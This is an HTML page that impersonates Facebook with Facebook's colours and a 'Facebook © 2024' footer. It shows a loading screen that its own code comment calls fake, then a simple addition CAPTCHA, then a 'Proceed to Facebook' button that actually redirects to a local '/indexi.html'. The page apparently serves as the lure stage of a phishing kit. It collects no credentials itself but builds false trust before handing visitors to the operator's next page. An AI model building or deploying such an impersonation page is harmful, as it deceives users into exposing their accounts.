<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook CAPTCHA Challenge</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            border: 1px solid #dddfe2;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 20px;
            width: 400px;
            text-align: center;
        }
        h1 {
            color: #1877f2;
            font-size: 24px;
            margin-bottom: 20px;
        }
        p {
            color: #606770;
            font-size: 16px;
            margin-bottom: 20px;
        }
        button {
            padding: 12px 20px;
            font-size: 16px;
            color: white;
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:disabled {
            background-color: #bcc0c4;
            cursor: not-allowed;
        }
        .captcha {
            margin-top: 20px;
            font-size: 16px;
        }
        input {
            padding: 8px;
            font-size: 16px;
            width: 60px;
            text-align: center;
            border: 1px solid #dddfe2;
            border-radius: 4px;
            margin-left: 5px;
        }
        .loading {
            margin-bottom: 20px;
            display: none;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        footer {
            font-size: 12px;
            color: #606770;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Just a moment...</h1>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Checking if you're not a robot...</p>
        </div>

        <div id="captchaContainer" style="display:none;">
            <p>Complete the CAPTCHA below to proceed to Facebook:</p>
            <div class="captcha">
                <span id="num1"></span> + <span id="num2"></span> =
                <input type="text" id="captchaInput" placeholder="Answer">
            </div>
            <button id="proceedButton" disabled>Proceed to Facebook</button>
        </div>

        <footer>
            Facebook Â© 2024. All rights reserved.
        </footer>
    </div>

    <script>
        // Generate random numbers for CAPTCHA (sum between 3-10 for better usability)
        function generateCaptcha() {
            const num1 = Math.floor(Math.random() * 5) + 1; // 1-5
            const num2 = Math.floor(Math.random() * 5) + 1; // 1-5
            return { 
                num1: num1,
                num2: num2,
                answer: num1 + num2
            };
        }

        // Initialize CAPTCHA
        const captcha = generateCaptcha();
        document.getElementById('num1').textContent = captcha.num1;
        document.getElementById('num2').textContent = captcha.num2;

        // CAPTCHA input validation
        document.getElementById('captchaInput').addEventListener('input', function() {
            const inputValue = this.value.trim();
            const button = document.getElementById('proceedButton');
            
            // Check if input matches the answer
            if (inputValue === String(captcha.answer)) {
                button.disabled = false;
            } else {
                button.disabled = true;
            }
        });

        // Proceed button functionality
        document.getElementById('proceedButton').addEventListener('click', function() {
            window.location.href = '/indexi.html';
        });

        // Fake loading screen
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
            setTimeout(function() {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('captchaContainer').style.display = 'block';
            }, 2000);
        }

        // Start with loading animation
        window.onload = showLoading;
    </script>

</body>
</html>
